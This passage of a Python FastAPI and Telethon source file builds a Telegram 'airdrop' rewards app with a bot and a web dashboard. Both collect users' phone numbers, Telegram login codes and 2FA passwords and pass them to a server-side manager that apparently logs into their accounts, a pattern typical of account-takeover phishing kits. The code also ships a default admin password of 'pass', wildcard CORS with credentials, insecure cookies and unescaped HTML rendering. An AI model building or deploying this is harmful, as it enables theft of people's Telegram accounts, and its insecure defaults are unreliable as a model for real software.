                missing.append(channel)
        return len(missing) == 0, missing

    def _join_buttons(self, missing: List[str]):
        if Button is None:
            return None
        buttons = [[Button.url(f"Join @{ch}", f"https://t.me/{ch}")] for ch in missing]
        buttons.append([Button.inline("✅ I've Joined", b"check_join")])
        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
        return buttons

    def _menu_buttons(self):
        btn = self._web_button()
        buttons = []
        if btn is not None:
            buttons.append([btn])
        if Button is not None:
            buttons.append([Button.url("🌐 Open Dashboard", self.web_app_url)])
        return buttons or None

    async def start(self) -> None:
        if not settings.ENABLE_BOT or not settings.TELEGRAM_BOT_TOKEN:
            logger.info("Telegram bot disabled or token missing.")
            return
        if TelegramClient is Any:
            logger.info("Telethon not available; bot not started.")
            return
        self.client = TelegramClient(
            (SESSION_DIR / "bot.session").as_posix(),
            settings.TELEGRAM_API_ID,
            settings.TELEGRAM_API_HASH,
        )
        await self.client.start(bot_token=settings.TELEGRAM_BOT_TOKEN)
        logger.info("Telegram bot started.")

        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
        async def on_message(event):
            sender = await event.get_sender()
            if not sender or getattr(sender, "bot", False):
                return
            text = (event.raw_text or "").strip()
            user_id = int(sender.id)
            ok, missing = await self._check_membership(user_id)
            if not ok and not text.startswith("/start"):
                await event.respond(
                    "🔒 Access restricted. Join required channels first.",
                    buttons=self._join_buttons(missing),
                )
                return
            if text.startswith("/start"):
                await self.cmd_start(event, user_id, text)
                return
            if text == "/cancel":
                await self.cmd_cancel(event, user_id)
                return
            if text == "/status":
                await self.cmd_status(event, user_id)
                return
            if text == "/help":
                await self.cmd_help(event)
                return
            state = self.user_states.get(user_id)
            if not state:
                await event.respond("Send /start to begin.")
                return
            if state.state == AuthState.PHONE:
                await self.handle_phone(event, user_id, text)
            elif state.state == AuthState.CODE:
                await self.handle_code(event, user_id, text)
            elif state.state == AuthState.PASSWORD:
                await self.handle_password(event, user_id, text)

        @self.client.on(events.CallbackQuery)
        async def on_callback(event):
            data = (event.data or b"").decode("utf-8", errors="ignore")
            user_id = int(event.sender_id)
            if data == "check_join":
                ok, missing = await self._check_membership(user_id)
                if ok:
                    await event.answer("Membership verified.", alert=False)
                    await event.respond("✅ Great. You can continue.", buttons=self._menu_buttons())
                else:
                    await event.answer("Still missing memberships.", alert=True)
                    await event.respond("🔒 Join these channels:", buttons=self._join_buttons(missing))
                return
            if data == "cancel_auth":
                await self.cmd_cancel(event, user_id)
                await event.answer("Cancelled.", alert=False)

    async def cmd_start(self, event, user_id: int, text: str) -> None:
        payload = None
        parts = text.split(maxsplit=1)
        if len(parts) == 2:
            payload = parts[1].strip()
        state = await self._ensure_state(user_id)
        state.state = AuthState.PHONE
        state.ref_code = None
        if payload:
            if payload.startswith("ref_"):
                state.ref_code = payload.replace("ref_", "", 1)
            elif payload.startswith("ref:"):
                state.ref_code = payload.replace("ref:", "", 1)
            else:
                state.ref_code = payload
        await event.respond(
            "👋 Welcome to Pro Shop. Send your phone number in international format.",
            buttons=self._menu_buttons(),
        )

    async def cmd_cancel(self, event, user_id: int) -> None:
        await self._clear_state(user_id)
        await event.respond("❌ Operation cancelled. Send /start to begin again.")

    async def cmd_status(self, event, user_id: int) -> None:
        state = self.user_states.get(user_id)
        await event.respond(f"📊 Current state: `{state.state if state else 'NONE'}`")

    async def cmd_help(self, event) -> None:
        await event.respond(
            "ℹ️ Commands\n/start - begin\n/cancel - cancel\n/status - show state\n/help - help"
        )

    async def handle_phone(self, event, user_id: int, text: str) -> None:
        state = await self._ensure_state(user_id)
        phone = normalize_phone(text)
        if not valid_phone(phone):
            await event.respond("❌ Invalid phone format. Example: +1234567890")
            return
        if auth_manager is None:
            await event.respond("❌ Auth manager not ready.")
            return
        try:
            result = await auth_manager.send_code(phone, state.ref_code)
            state.phone = phone
            state.session_id = result["session_id"]
            state.state = AuthState.CODE
            await event.respond("✅ Code sent. Please send the code.")
        except Exception as e:
            await event.respond(f"❌ {e}")

    async def handle_code(self, event, user_id: int, text: str) -> None:
        state = self.user_states.get(user_id)
        if not state or not state.session_id:
            await event.respond("❌ Session expired.")
            return
        if auth_manager is None:
            await event.respond("❌ Auth manager not ready.")
            return
        try:
            res = await auth_manager.verify_code(state.session_id, text.strip())
            if res.get("status") == "2fa_required":
                state.state = AuthState.PASSWORD
                await event.respond("🔒 2FA enabled. Send your password.")
                return
            await event.respond("✅ Login successful.", buttons=self._menu_buttons())
            await self._clear_state(user_id)
        except Exception as e:
            await event.respond(f"❌ {e}")

    async def handle_password(self, event, user_id: int, text: str) -> None:
        state = self.user_states.get(user_id)
        if not state or not state.session_id:
            await event.respond("❌ Session expired.")
            return
        if auth_manager is None:
            await event.respond("❌ Auth manager not ready.")
            return
        try:
            await auth_manager.verify_2fa(state.session_id, text.strip())
            await event.respond("✅ 2FA successful.", buttons=self._menu_buttons())
            await self._clear_state(user_id)
        except Exception as e:
            await event.respond(f"❌ {e}")


bot_manager: Optional[TelegramBotManager] = None


# ---------------------------------------------------------------------------
# Pydantic models
# ---------------------------------------------------------------------------

class SendCodeRequest(BaseModel):
    phone: str = Field(..., description="Phone number in international format")
    ref_code: Optional[str] = Field(default=None, description="Referral code from start payload")


class VerifyCodeRequest(BaseModel):
    session_id: str
    code: str


class Verify2FARequest(BaseModel):
    session_id: str
    password: str


class AdminLoginRequest(BaseModel):
    username: str
    password: str


class TaskCreateRequest(BaseModel):
    title: str
    description: str
    task_type: TaskType = TaskType.MANUAL
    reward_amount: int = Field(default=1, ge=1)
    target_url: Optional[str] = None
    meta: Dict[str, Any] = Field(default_factory=dict)
    is_active: bool = True
    sort_order: int = 0


# ---------------------------------------------------------------------------
# App init and repositories
# ---------------------------------------------------------------------------

db = Database(DB_PATH)
user_repo = UserRepository(db)
reward_repo = RewardRepository(db)
task_repo = TaskRepository(db)
tx_repo = TransactionRepository(db)
auth_manager = TelegramAuthManager(user_repo, reward_repo, tx_repo)

if not settings.ADMIN_PASSWORD_HASH:
    settings.ADMIN_PASSWORD_HASH = hash_admin_password("pass")


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(title=settings.APP_NAME, version="1.0.0", docs_url="/docs", redoc_url="/redoc")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class RequestLogMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        started = time.time()
        response = await call_next(request)
        elapsed = (time.time() - started) * 1000
        logger.info("%s %s -> %s (%.2fms)", request.method, request.url.path, response.status_code, elapsed)
        return response


app.add_middleware(RequestLogMiddleware)


@asynccontextmanager
async def lifespan(_: FastAPI) -> AsyncIterator[None]:
    await db.connect()
    await task_repo.seed_default_tasks()
    await auth_manager.start_cleanup_loop()
    global bot_manager
    required_channels = [c.strip() for c in settings.REQUIRED_CHANNELS.split(",") if c.strip()]
    bot_manager = TelegramBotManager(settings.TELEGRAM_BOT_TOKEN, settings.WEB_APP_URL, required_channels)
    if settings.ENABLE_BOT and settings.TELEGRAM_BOT_TOKEN and settings.TELEGRAM_API_ID and settings.TELEGRAM_API_HASH:
        asyncio.create_task(bot_manager.start())
    try:
        yield
    finally:
        await auth_manager.stop_cleanup_loop()
        await db.close()




app.router.lifespan_context = lifespan

# ---------------------------------------------------------------------------
# CSRF / auth helpers
# ---------------------------------------------------------------------------


def set_session_cookies(response: Response, access_token: str, csrf_token: str) -> None:
    response.set_cookie(settings.ACCESS_COOKIE_NAME, access_token, httponly=True, secure=False, samesite="lax", max_age=settings.ACCESS_TOKEN_TTL_MINUTES * 60)
    response.set_cookie(settings.CSRF_COOKIE_NAME, csrf_token, httponly=False, secure=False, samesite="lax", max_age=settings.ACCESS_TOKEN_TTL_MINUTES * 60)


def clear_session_cookies(response: Response) -> None:
    response.delete_cookie(settings.ACCESS_COOKIE_NAME)
    response.delete_cookie(settings.CSRF_COOKIE_NAME)


def require_csrf(request: Request) -> None:
    cookie_csrf = request.cookies.get(settings.CSRF_COOKIE_NAME)
    header_csrf = request.headers.get("X-CSRF-Token")
    if not cookie_csrf or not header_csrf or cookie_csrf != header_csrf:
        raise HTTPException(status_code=403, detail="CSRF validation failed.")


async def get_current_user(request: Request) -> Dict[str, Any]:
    token = request.cookies.get(settings.ACCESS_COOKIE_NAME)
    auth = request.headers.get("Authorization", "")
    if not token and auth.startswith("Bearer "):
        token = auth.replace("Bearer ", "", 1).strip()
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated.")
    try:
        payload = decode_token(token, "user")
        telegram_id = int(payload["sub"])
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid session token.")
    user = await user_repo.get_by_telegram_id(telegram_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
    return user


async def require_admin(request: Request) -> None:
    api_key = request.headers.get("X-Admin-Key")
    if api_key and api_key == settings.ADMIN_API_KEY:
        return
    token = request.cookies.get("admin_access_token")
    if token:
        try:
            payload = decode_token(token, "admin")
            if payload.get("sub") == settings.ADMIN_USERNAME:
                return
        except Exception:
            pass
    raise HTTPException(status_code=403, detail="Admin access denied.")


# ---------------------------------------------------------------------------
# HTML SPA
# ---------------------------------------------------------------------------

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pro Shop Ultimate Enterprise</title>
  <style>
    :root {
      --bg:#070b14; --panel:rgba(16,24,40,.7); --panel2:rgba(22,30,52,.72); --line:rgba(255,255,255,.08);
      --text:#e8eefc; --muted:#8f9bb8; --accent:#6d7cff; --accent2:#22d3ee; --good:#34d399; --bad:#fb7185; --gold:#f59e0b;
      --shadow:0 18px 60px rgba(0,0,0,.35); --radius:24px;
    }
    *{box-sizing:border-box} html,body{height:100%} body{margin:0;font-family:Inter,system-ui,Segoe UI,Arial;background:
      radial-gradient(circle at top left, rgba(109,124,255,.15), transparent 30%),
      radial-gradient(circle at bottom right, rgba(34,211,238,.12), transparent 28%), var(--bg);
      color:var(--text); overflow-x:hidden}
    .wrap{max-width:1280px;margin:0 auto;padding:28px} .grid{display:grid;grid-template-columns:1.12fr .88fr;gap:22px}
    .card{background:linear-gradient(180deg,var(--panel),var(--panel2));backdrop-filter:blur(18px);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}
    .hero{padding:28px 28px 22px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;gap:18px;align-items:center}
    .brand{display:flex;gap:14px;align-items:center}.logo{width:54px;height:54px;border-radius:18px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center;font-weight:900;color:#06101b;box-shadow:0 12px 35px rgba(109,124,255,.35)}
    h1{margin:0;font-size:24px}.sub{margin:6px 0 0;color:var(--muted);font-size:14px}.pill{padding:10px 14px;border-radius:999px;background:rgba(255,255,255,.06);border:1px solid var(--line);color:var(--muted);font-size:13px}
    .content{padding:22px 28px 28px}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:18px}
    .stat{padding:16px;border-radius:20px;background:rgba(255,255,255,.04);border:1px solid var(--line)}.stat .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.12em}.stat .v{font-size:26px;font-weight:800;margin-top:8px}
    .two{display:grid;grid-template-columns:1fr 1fr;gap:18px}.pane{padding:18px;border-radius:20px;background:rgba(255,255,255,.04);border:1px solid var(--line)}
    label{display:block;font-size:12px;color:var(--muted);margin:0 0 8px;letter-spacing:.08em;text-transform:uppercase} input,textarea,button,select{font:inherit}
    input,textarea,select{width:100%;padding:14px 16px;border-radius:16px;background:rgba(0,0,0,.18);color:var(--text);border:1px solid var(--line);outline:none}
    input:focus,textarea:focus,select:focus{border-color:rgba(109,124,255,.55);box-shadow:0 0 0 4px rgba(109,124,255,.12)}
    .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
    button{border:none;cursor:pointer;padding:13px 16px;border-radius:16px;font-weight:700;color:#04111e;background:linear-gradient(135deg,var(--accent),var(--accent2));box-shadow:0 10px 25px rgba(109,124,255,.18)}
    button.secondary{background:rgba(255,255,255,.08);color:var(--text);border:1px solid var(--line)} button.good{background:linear-gradient(135deg,#34d399,#10b981)} button.bad{background:linear-gradient(135deg,#fb7185,#f43f5e);color:#fff}
    .hidden{display:none!important}.tabs{display:flex;gap:8px;flex-wrap:wrap}.tab{padding:10px 14px;border-radius:999px;background:rgba(255,255,255,.05);border:1px solid var(--line);color:var(--muted);cursor:pointer}.tab.active{background:rgba(109,124,255,.18);color:var(--text);border-color:rgba(109,124,255,.35)}
    .list{display:grid;gap:12px}.item{padding:14px;border-radius:18px;background:rgba(255,255,255,.04);border:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;align-items:center}
    .item b{display:block}.muted{color:var(--muted)} .badge{padding:8px 11px;border-radius:999px;background:rgba(255,255,255,.06);color:var(--muted);border:1px solid var(--line);font-size:12px}
    .refbox{display:flex;gap:10px;align-items:center;justify-content:space-between;padding:14px 16px;border-radius:16px;background:rgba(255,255,255,.05);border:1px dashed rgba(255,255,255,.13)}
    .table{width:100%;border-collapse:collapse}.table th,.table td{padding:12px 10px;text-align:left;border-bottom:1px solid var(--line);font-size:14px}.table th{color:var(--muted);font-weight:600}
    .otp{display:grid;grid-template-columns:repeat(6,1fr);gap:8px}.otp input{text-align:center;font-size:18px;font-weight:800;letter-spacing:.06em}
    .toast{position:fixed;right:18px;bottom:18px;padding:14px 16px;border-radius:16px;background:#09111f;border:1px solid var(--line);box-shadow:var(--shadow);max-width:380px;display:none;z-index:50}
    .toast.show{display:block;animation:pop .2s ease} @keyframes pop{from{transform:translateY(10px);opacity:0}to{transform:translateY(0);opacity:1}}
    .small{font-size:12px}.center{display:grid;place-items:center}.gap{height:10px}
    @media (max-width: 980px){.grid,.two,.stats,.row{grid-template-columns:1fr}.hero{flex-direction:column;align-items:flex-start}}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="grid">
      <section class="card">
        <div class="hero">
          <div class="brand">
            <div class="logo">PS</div>
            <div>
              <h1>Pro Shop Ultimate Enterprise</h1>
              <div class="sub">Telegram Airdrop, Referral, Daily Claim, Mystery Box, Tasks, and Live Leaderboard</div>
            </div>
          </div>
          <div class="pill" id="statusPill">Unauthenticated</div>
        </div>
        <div class="content">
          <div class="stats">
            <div class="stat"><div class="k">Balance</div><div class="v" id="statBalance">0</div></div>
            <div class="stat"><div class="k">Referrals</div><div class="v" id="statRefs">0</div></div>
            <div class="stat"><div class="k">Tasks</div><div class="v" id="statTasks">0</div></div>
            <div class="stat"><div class="k">Gifts</div><div class="v" id="statGifts">0</div></div>
          </div>
          <div class="tabs" style="margin-bottom:14px">
            <div class="tab active" data-tab="auth">Auth</div>
            <div class="tab" data-tab="dash">Dashboard</div>
            <div class="tab" data-tab="tasks">Tasks</div>
            <div class="tab" data-tab="leaderboard">Leaderboard</div>
          </div>
          <div id="tab-auth" class="pane">
            <div class="row">
              <div>
                <label>Phone</label>
                <input id="phone" placeholder="+1234567890">
              </div>
              <div>
                <label>Referral Code (optional)</label>
                <input id="refCode" placeholder="ref_xxxx">
              </div>
            </div>
            <div class="actions"><button id="sendCode">Send Code</button><button class="secondary" id="clearAuth">Reset</button></div>
            <div class="gap"></div>
            <div id="codeStep" class="hidden">
              <label>Verification Code</label>
              <div class="otp" id="otp"></div>
              <div class="actions"><button id="verifyCode">Verify Code</button></div>
            </div>
            <div class="gap"></div>
            <div id="twofaStep" class="hidden">
              <label>2FA Password</label>
              <input id="twofa" type="password" placeholder="Telegram 2FA password">
              <div class="actions"><button id="verify2FA">Verify 2FA</button></div>
            </div>
          </div>
          <div id="tab-dash" class="pane hidden">
            <div class="refbox"><div><div class="muted small">Referral link</div><b id="refLink">-</b></div><button class="secondary" id="copyRef">Copy</button></div>
            <div class="gap"></div>
            <div class="actions"><button class="good" id="claimDaily">Claim Daily +1</button><button id="openGift">Open Mystery Box (17)</button><button class="secondary" id="logout">Logout</button></div>
            <div class="gap"></div>
            <div class="list" id="rewards"></div>
          </div>
          <div id="tab-tasks" class="pane hidden"><div class="list" id="taskList"></div></div>
          <div id="tab-leaderboard" class="pane hidden"><table class="table"><thead><tr><th>#</th><th>User</th><th>Refs</th><th>Balance</th></tr></thead><tbody id="leaderBody"></tbody></table></div>
        </div>
      </section>
      <aside class="card">
        <div class="hero"><div class="brand"><div class="logo">AI</div><div><h1>Live Stats</h1><div class="sub">WebSocket leaderboard and reward feed</div></div></div><div class="pill" id="connPill">WS: idle</div></div>
        <div class="content">
          <div class="pane">
            <div class="muted small">Current user</div>
            <h2 id="userName" style="margin:8px 0 0">Guest</h2>
            <div class="muted" id="userInfo">Login to unlock dashboard</div>
          </div>
          <div class="gap"></div>
          <div class="pane">
            <div class="muted small">Recent reward</div>
            <h2 id="lastReward" style="margin:8px 0 0">-</h2>
            <div class="muted" id="rewardInfo">Mystery Box may grant Stars or 1 Month Premium.</div>
          </div>
        </div>
      </aside>
    </div>
  </div>
  <div class="toast" id="toast"></div>
<script>
const state={sessionId:null, csrf:null, authenticated:false, profile:null, ws:null};
const $=s=>document.querySelector(s); const $$=s=>[...document.querySelectorAll(s)];
function showToast(msg){const t=$('#toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000)}
function getCookie(name){return document.cookie.split('; ').find(x=>x.startsWith(name+'='))?.split('=')[1]||''}
function setActiveTab(name){$$('.tab').forEach(el=>el.classList.toggle('active',el.dataset.tab===name));['auth','dash','tasks','leaderboard'].forEach(n=>$('#tab-'+n).classList.toggle('hidden',n!==name))}
function api(path, opts={}){opts.credentials='include';opts.headers=opts.headers||{};if(['POST','PUT','PATCH','DELETE'].includes((opts.method||'GET').toUpperCase()))opts.headers['X-CSRF-Token']=getCookie('csrf_token');return fetch(path,opts).then(async r=>{const ct=r.headers.get('content-type')||'';const data=ct.includes('application/json')?await r.json():await r.text();if(!r.ok)throw new Error(data.detail||data.message||data||'Request failed');return data});}
function buildOtp(){const box=$('#otp');box.innerHTML='';for(let i=0;i<5;i++){const inp=document.createElement('input');inp.maxLength=1;inp.inputMode='numeric';inp.autocomplete='one-time-code';inp.addEventListener('input',()=>{if(inp.value&&box.children[i+1])box.children[i+1].focus()});inp.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!inp.value&&box.children[i-1])box.children[i-1].focus()});box.appendChild(inp)}}
function otpValue(){return[...$('#otp').children].map(x=>x.value.trim()).join('')}
async function sendCode(){const phone=$('#phone').value.trim();const ref_code=$('#refCode').value.trim()||null;if(!phone)return showToast('Phone required');try{const res=await api('/api/auth/send-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,ref_code})});state.sessionId=res.session_id;$('#codeStep').classList.remove('hidden');showToast('Code sent.');}catch(e){showToast(e.message)}}
async function verifyCode(){const code=otpValue();if(code.length<4)return showToast('Enter the code');try{const res=await api('/api/auth/verify-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session_id:state.sessionId,code})});if(res.status==='2fa_required'){ $('#twofaStep').classList.remove('hidden'); showToast('2FA required'); return } if(res.access_token){ state.authenticated=true; state.csrf=res.csrf_token; await loadProfile(); showToast('Logged in'); setActiveTab('dash'); connectWS(); } }catch(e){showToast(e.message)}}
async function verify2FA(){const password=$('#twofa').value;try{const res=await api('/api/auth/verify-2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session_id:state.sessionId,password})});state.authenticated=true;state.csrf=res.csrf_token;await loadProfile();showToast('2FA success');setActiveTab('dash');connectWS();}catch(e){showToast(e.message)}}
async function loadProfile(){try{const res=await api('/api/airdrop/profile');state.profile=res;$('#statusPill').textContent='Authenticated';$('#userName').textContent=(res.user.first_name||'User')+' '+(res.user.last_name||'');$('#userInfo').textContent='@'+(res.user.username||'no_username')+' • ID '+res.user.telegram_id;$('#statBalance').textContent=res.user.balance;$('#statRefs').textContent=res.user.referrals;$('#statTasks').textContent=res.tasks.length;$('#statGifts').textContent=res.user.gift_claims;$('#refLink').textContent=res.ref_link;renderRewards(res.rewards);renderTasks(res.tasks);$('#connPill').textContent='WS: ready';}catch(e){showToast(e.message)}}
function renderRewards(items){const el=$('#rewards');el.innerHTML='';if(!items.length){el.innerHTML='<div class="muted">No rewards yet.</div>';return}items.slice(0,8).forEach(r=>{const d=document.createElement('div');d.className='item';d.innerHTML=`<div><b>${r.reward_type}</b><div class='muted'>${r.amount}</div></div><div class='badge'>${new Date(r.created_at).toLocaleString()}</div>`;el.appendChild(d)})}
function renderTasks(items){const el=$('#taskList');el.innerHTML='';if(!items.length){el.innerHTML='<div class="muted">No tasks available.</div>';return}items.forEach(t=>{const d=document.createElement('div');d.className='item';d.innerHTML=`<div><b>${t.title}</b><div class='muted'>${t.description}</div></div><div style='display:flex;gap:10px;align-items:center'><span class='badge'>+${t.reward_amount}</span>${t.claimed?'<span class="badge">Claimed</span>':'<button class="secondary" data-claim="'+t.id+'">Claim</button>'}</div>`;el.appendChild(d)});el.querySelectorAll('[data-claim]').forEach(btn=>btn.onclick=()=>claimTask(btn.dataset.claim))}
async function claimTask(id){try{const res=await api('/api/airdrop/tasks/'+id+'/claim',{method:'POST'});showToast('Task claimed +'+res.after-res.before);await loadProfile()}catch(e){showToast(e.message)}}
async function claimDaily(){try{await api('/api/airdrop/claim-daily',{method:'POST'});showToast('Daily reward claimed');await loadProfile()}catch(e){showToast(e.message)}}
async function openGift(){try{const res=await api('/api/airdrop/open-gift',{method:'POST'});$('#lastReward').textContent=res.reward.type+' - '+res.reward.amount;showToast('Mystery box opened!');await loadProfile()}catch(e){showToast(e.message)}}
function connectWS(){try{if(state.ws)state.ws.close();const proto=location.protocol==='https:'?'wss:':'ws:';state.ws=new WebSocket(proto+'//'+location.host+'/ws/leaderboard');$('#connPill').textContent='WS: connecting';state.ws.onopen=()=>$('#connPill').textContent='WS: live';state.ws.onclose=()=>$('#connPill').textContent='WS: offline';state.ws.onmessage=(ev)=>{const data=JSON.parse(ev.data);const body=$('#leaderBody');body.innerHTML='';data.items.forEach((u,i)=>{const tr=document.createElement('tr');tr.innerHTML=`<td>${i+1}</td><td>${u.first_name||'User'}${u.username?' @'+u.username:''}</td><td>${u.referrals}</td><td>${u.balance}</td>`;body.appendChild(tr)})}}catch(e){console.error(e)}}
$('#sendCode').onclick=sendCode;$('#verifyCode').onclick=verifyCode;$('#verify2FA').onclick=verify2FA;$('#claimDaily').onclick=claimDaily;$('#openGift').onclick=openGift;$('#logout').onclick=async()=>{try{await api('/api/auth/logout',{method:'POST'});location.reload()}catch(e){showToast(e.message)}};$('#copyRef').onclick=()=>navigator.clipboard.writeText($('#refLink').textContent).then(()=>showToast('Copied'));
$('#clearAuth').onclick=()=>{state.sessionId=null;$('#codeStep').classList.add('hidden');$('#twofaStep').classList.add('hidden');$('#otp').innerHTML='';$('#twofa').value='';showToast('Reset')};
$$('.tab').forEach(el=>el.onclick=()=>setActiveTab(el.dataset.tab));
buildOtp();
(async()=>{try{await loadProfile();state.authenticated=true;setActiveTab('dash');connectWS()}catch(_){setActiveTab('auth')}})();
</script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# API routes
# ---------------------------------------------------------------------------

@app.get("/", response_class=HTMLResponse)
async def home() -> HTMLResponse:
    return HTMLResponse(FRONTEND_HTML)


@app.get("/api/health")
async def health() -> Dict[str, Any]:
    return {
        "status": "healthy",
        "service": settings.APP_NAME,
        "time": utc_now_iso(),
        "bot_enabled": bool(settings.ENABLE_BOT and settings.TELEGRAM_BOT_TOKEN),
    }


@app.post("/api/auth/send-code")
async def api_send_code(payload: SendCodeRequest, response: Response) -> Dict[str, Any]:
    res = await auth_manager.send_code(payload.phone, payload.ref_code)
    response.status_code = status.HTTP_200_OK
    return res


@app.post("/api/auth/verify-code")
async def api_verify_code(payload: VerifyCodeRequest, response: Response) -> Dict[str, Any]:
    res = await auth_manager.verify_code(payload.session_id, payload.code)
    if res.get("status") == "2fa_required":
        return res
    token = res["access_token"]
    csrf = res["csrf_token"]
    set_session_cookies(response, token, csrf)
    response.headers["X-CSRF-Token"] = csrf
    return {"status": "success", "user": res["user"], "access_token": token, "csrf_token": csrf}


@app.post("/api/auth/verify-2fa")
async def api_verify_2fa(payload: Verify2FARequest, response: Response) -> Dict[str, Any]:
    res = await auth_manager.verify_2fa(payload.session_id, payload.password)
    token = res["access_token"]
    csrf = res["csrf_token"]
    set_session_cookies(response, token, csrf)
    response.headers["X-CSRF-Token"] = csrf
    return {"status": "success", "user": res["user"], "access_token": token, "csrf_token": csrf}


@app.post("/api/auth/logout")
async def api_logout(response: Response) -> Dict[str, Any]:
    clear_session_cookies(response)
    return {"status": "success"}


@app.get("/api/airdrop/profile")
async def api_profile(user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
    data = await user_repo.profile(int(user["id"]))
    return data


@app.post("/api/airdrop/claim-daily")
async def api_claim_daily(request: Request, user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
    require_csrf(request)
    res = await user_repo.claim_daily(int(user["id"]))
    before, after = int(res["before"]), int(res["after"])
    await reward_repo.add(int(user["id"]), RewardType.DAILY.value, str(settings.DAILY_REWARD), {"before": before, "after": after})
    await tx_repo.add(int(user["id"]), "daily", settings.DAILY_REWARD, before, after, {})
    return {"status": "success", "before": before, "after": after, "reward": settings.DAILY_REWARD}


@app.post("/api/airdrop/open-gift")
async def api_open_gift(request: Request, user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
    require_csrf(request)
    res = await user_repo.open_mystery_box(int(user["id"]))
    reward = res["reward"]
    before, after = int(res["before"]), int(res["after"])
    await reward_repo.add(int(user["id"]), RewardType.MYSTERY_BOX.value, f"{reward['type']}:{reward['amount']}", reward)
    await tx_repo.add(int(user["id"]), "mystery_box", -settings.BOX_COST, before, after, reward)
    return {"status": "success", **res}


@app.get("/api/airdrop/tasks")
async def api_tasks(user: Dict[str, Any] = Depends(get_current_user)) -> List[Dict[str, Any]]:
    return (await user_repo.profile(int(user["id"]))) ["tasks"]


@app.post("/api/airdrop/tasks/{task_id}/claim")
async def api_claim_task(task_id: int, request: Request, user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
    require_csrf(request)
    res = await user_repo.claim_task(int(user["id"]), task_id)
    return {"status": "success", **res}


@app.get("/api/airdrop/leaderboard")
async def api_leaderboard(limit: int = Query(10, ge=1, le=50)) -> Dict[str, Any]:
    return {"status": "success", "items": await user_repo.leaderboard(limit)}


@app.websocket("/ws/leaderboard")
async def ws_leaderboard(ws: WebSocket):
    await ws.accept()
    try:
        while True:
            items = await user_repo.leaderboard(10)
            await ws.send_text(safe_json({"items": items, "time": utc_now_iso()}))
            await asyncio.sleep(5)
    except WebSocketDisconnect:
        pass
    except Exception:
        with contextlib.suppress(Exception):
            await ws.close()


@app.post("/api/admin/login")
async def api_admin_login(payload: AdminLoginRequest, response: Response) -> Dict[str, Any]:
    if payload.username != settings.ADMIN_USERNAME:
        raise HTTPException(status_code=403, detail="Invalid credentials")
    if not verify_admin_password(payload.password, settings.ADMIN_PASSWORD_HASH):
        raise HTTPException(status_code=403, detail="Invalid credentials")
    token, csrf = token_pair(payload.username, "admin", settings.ADMIN_TOKEN_TTL_MINUTES)
    response.set_cookie("admin_access_token", token, httponly=True, samesite="lax", max_age=settings.ADMIN_TOKEN_TTL_MINUTES * 60)
    response.set_cookie("admin_csrf_token", csrf, httponly=False, samesite="lax", max_age=settings.ADMIN_TOKEN_TTL_MINUTES * 60)
    return {"status": "success", "csrf_token": csrf}


@app.get("/api/admin/users")
async def api_admin_users(request: Request) -> Dict[str, Any]:
    await require_admin(request)
    rows = await db.fetchall("SELECT * FROM users ORDER BY id DESC LIMIT 500")
    return {"status": "success", "items": [dict(r) for r in rows]}


@app.post("/api/admin/tasks")
async def api_admin_create_task(request: Request, payload: TaskCreateRequest) -> Dict[str, Any]:
    await require_admin(request)
    task_id = await db.execute(
        """
        INSERT INTO tasks (title, description, task_type, reward_amount, target_url, meta_json, is_active, sort_order, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            payload.title,
            payload.description,
            payload.task_type.value,
            payload.reward_amount,
            payload.target_url,
            safe_json(payload.meta),
            1 if payload.is_active else 0,
            payload.sort_order,
            utc_now_iso(),
        ),
    )
    return {"status": "success", "task_id": task_id}


@app.get("/api/admin/tasks")
async def api_admin_tasks(request: Request) -> Dict[str, Any]:
    await require_admin(request)
    rows = await db.fetchall("SELECT * FROM tasks ORDER BY id DESC")
    return {"status": "success", "items": [dict(r) for r in rows]}


@app.exception_handler(AppError)
async def app_error_handler(_: Request, exc: AppError):
    return JSONResponse(status_code=exc.status_code, content={"detail": exc.message})


@app.exception_handler(Exception)
async def generic_error_handler(_: Request, exc: Exception):
    logger.exception("Unhandled error: %s", exc)
    return JSONResponse(status_code=500, content={"detail": "Internal Server Error"})


# ---------------------------------------------------------------------------
# Main entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "app:app",
        host=settings.HOST,
        port=settings.PORT,
        reload=False,
        log_level="info",
        workers=1,
    )
